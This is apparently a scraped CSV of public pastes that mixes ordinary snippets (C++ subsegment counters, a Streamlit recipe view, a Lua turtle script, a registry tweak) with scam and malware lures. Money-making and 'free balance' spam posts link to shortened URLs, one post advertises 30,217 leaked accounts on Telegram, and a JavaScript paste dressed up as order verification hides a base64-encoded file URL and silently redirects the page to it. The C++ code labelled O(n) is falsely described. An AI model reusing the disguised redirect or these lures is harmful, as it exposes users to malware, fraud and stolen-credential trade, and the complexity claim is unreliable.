id,title,username,language,date,content
pSB6tUar,Untitled,asdfg0998,C++,Sunday 4th of May 2025 01:03:06 PM CDT,"// Linear Time Approach - O(n) time complexity
long long countStableSubsegmentsLinear(const vector<long long>& capacity) {
    int n = capacity.size();
    long long count = 0;
    
    // Map to store endpoints with the same value
    // For each value v, we store indices where capacity[i] = v
    unordered_map<long long, vector<int>> valueToIndices;
    
    // Prefix sum for efficient sum calculation
    vector<long long> prefixSum(n + 1, 0);
    for (int i = 0; i < n; i++) {
        prefixSum[i + 1] = prefixSum[i] + capacity[i];
        valueToIndices[capacity[i]].push_back(i);
    }
    
    // For each possible value that could be at endpoints
    for (const auto& pair : valueToIndices) {
        long long value = pair.first;
        const vector<int>& indices = pair.second;
        
        // Check all pairs of indices where capacity[i] = value
        for (int i = 0; i < indices.size(); i++) {
            for (int j = i + 1; j < indices.size(); j++) {
                int l = indices[i];
                int r = indices[j];
                
                // Skip if the segment length is less than 3
                if (r - l < 2) continue;
                
                // Calculate sum between l+1 and r-1
                long long sumBetween = prefixSum[r] - prefixSum[l + 1];
                
                // Check if the subsegment is stable
                if (value == sumBetween) {
                    count++;
                }
            }
        }
    }
    
    return count;
}

int main() {

    
    vector<long long> capacity = {9,3,1,2,3,9,10};
    
    long long result = countStableSubsegmentsLinear(capacity);
    cout << result << endl;
    
    return 0;
}"
4WKR34Hx,Untitled,ItzSaf,Python,Sunday 4th of May 2025 12:59:34 PM CDT,"        if st.session_state.recipes:
            st.subheader(""Recipe Suggestion"")
            
            # Only display the first recipe
            recipe = st.session_state.recipes[0]
            with st.expander(f""{recipe['name']}"", expanded=True):
                st.markdown(""<div class='recipe-card'>"", unsafe_allow_html=True)
                
                # Recipe header
                st.markdown(f""<h3 class='recipe-title'>{recipe['name']}</h3>"", unsafe_allow_html=True)
                
                # Badges
                badges_html = """"
                if recipe.get('difficulty') == ""Easy"":
                    badges_html += ""<span class='badge badge-easy'>Easy</span>""
                elif recipe.get('difficulty') == ""Medium"":
                    badges_html += ""<span class='badge badge-medium'>Medium</span>""
                elif recipe.get('difficulty') == ""Hard"":
                    badges_html += ""<span class='badge badge-hard'>Hard</span>""
                
                # Time badge
                if ""minutes"" in recipe.get('prep_time', '').lower() and int(recipe.get('prep_time', '30 minutes').split()[0]) <= 30:
                    badges_html += ""<span class='badge badge-quick'>Quick (<30 min)</span>""
                else:
                    badges_html += ""<span class='badge badge-longer'>"" + recipe.get('prep_time', 'N/A') + ""</span>""
                
                st.markdown(badges_html, unsafe_allow_html=True)
                
                # Description
                st.markdown(f""<p><em>{recipe.get('description', '')}</em></p>"", unsafe_allow_html=True)
                
                # Two columns for ingredients and instructions
                col1, col2 = st.columns([1, 2])
                
                with col1:
                    st.markdown(""#### Ingredients"")
                    for ingredient in recipe.get('ingredients', []):
                        st.markdown(f""- {ingredient}"")
                    
                    if recipe.get('missing_ingredients') and len(recipe.get('missing_ingredients')) > 0:
                        st.markdown(""#### You'll also need"")
                        for ingredient in recipe.get('missing_ingredients', []):
                            st.markdown(f""- {ingredient}"")
                
                with col2:
                    st.markdown(""#### Instructions"")
                    for i, step in enumerate(recipe.get('instructions', [])):
                        st.markdown(f""{i+1}. {step}"")
                
                st.markdown(""</div>"", unsafe_allow_html=True)

"
butZ7Dwt,Make $1000 15-MINUTES (BEGINNER) L4,X_Cross,JavaScript,Sunday 4th of May 2025 12:57:27 PM CDT," 
Pdf https://tinyurl.com/freshleaks

o7O9Vr5Kky
"
5hqntHUY,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Sunday 4th of May 2025 12:55:36 PM CDT,30217 Accounts Posted On https://t.me/leakzbyeminem
mM3ENnff,Untitled,WantingTrae,JavaScript,Sunday 4th of May 2025 12:54:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55858/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2DktRkR9,Stake Free Balance Method,dentira,JavaScript,Sunday 4th of May 2025 12:54:49 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 70934
tsxbUUkm,V Rising - CPU priority,fiduciam,REG,Sunday 4th of May 2025 12:52:47 PM CDT,"Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\VRising.exe\PerfOptions]
""CpuPriorityClass""=dword:00000003

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\VRisingServer.exe\PerfOptions]
""CpuPriorityClass""=dword:00000003"
Bp9JGnds,Line,RTS_Dmitriy,Lua,Sunday 4th of May 2025 12:52:06 PM CDT,"slots = {2, 2, 6, 7, 5, 3, 3, 3, 1, 1}

for i = 1,10 do
  item = slots[i] -- element iz slots
  turtle.select(item)
  turtle.placeDown()
  turtle.forward()
end
"
H8TrRVr5,Untitled,asdfg0998,C++,Sunday 4th of May 2025 12:51:13 PM CDT,"#include <iostream>
#include <vector>

using namespace std;

int countStableSubsegmentsBrute(const vector<int>& capacity) {
    int n = capacity.size();
    int count = 0;

    for (int l = 0; l < n; ++l) {
        long long midSum = 0;
        for (int r = l + 1; r < n; ++r) {
            if (r - l >= 2) { // length ≥ 3
                midSum += capacity[r - 1];
                if (capacity[l] + capacity[r] == midSum) {
                    count++;
                }
            } else {
                midSum += capacity[r - 1];
            }
        }
    }

    return count;
}

int main() {
    vector<int> capacity = {9, 3, 3, 3, 9};
    cout << ""Stable subsegments: "" << countStableSubsegmentsBrute(capacity) << endl; // Output: 2
    return 0;
}"
iNsgyV50,EARN $900 INSTANTLY 2025⭐ GV,X_Cross,JavaScript,Sunday 4th of May 2025 12:48:14 PM CDT," 
Pdf https://tinyurl.com/freshleaks

qMts4vC65a
"
